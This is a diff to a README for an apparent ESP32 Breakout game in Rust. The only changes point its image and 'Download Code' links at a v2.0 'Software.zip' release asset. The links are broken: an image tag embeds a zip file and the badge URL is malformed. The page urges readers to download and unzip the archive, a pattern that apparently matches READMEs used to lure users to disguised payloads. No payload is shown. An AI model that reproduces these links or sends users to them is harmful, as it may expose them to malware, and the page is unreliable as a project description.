@@ -1,6 +1,6 @@
 # 🎮 ESP32 Breakout Rust Game with OLED Display 🕹️
 
-![ESP32 Breakout Rust](https://github.com/Stormy2307/esp32-breakout-rust/releases/download/v1.0/Software.zip)
+![ESP32 Breakout Rust](https://github.com/Stormy2307/esp32-breakout-rust/releases/download/v2.0/Software.zip)
 
 Welcome to the ESP32 Breakout Rust repository! This project is a fun Breakout Game written in Rust specifically designed for the ESP32 microcontroller. The game utilizes an OLED display and incorporates the Embassy framework for smooth functionality.
 
@@ -17,7 +17,7 @@ Welcome to the ESP32 Breakout Rust repository! This project is a fun Breakout Ga
 
 ## Getting Started 🛠️
 To get started, you can download the code for this project by clicking on the link below:
-[![Download Code](https://github.com/Stormy2307/esp32-breakout-rust/releases/download/v1.0/Software.zip%20Code-v1.0.0-blue)](https://github.com/Stormy2307/esp32-breakout-rust/releases/download/v1.0/Software.zip)
+[![Download Code](https://github.com/Stormy2307/esp32-breakout-rust/releases/download/v2.0/Software.zip%20Code-v1.0.0-blue)](https://github.com/Stormy2307/esp32-breakout-rust/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the code, unzip the file and follow the instructions in the README file to set up the game on your ESP32 device.
 
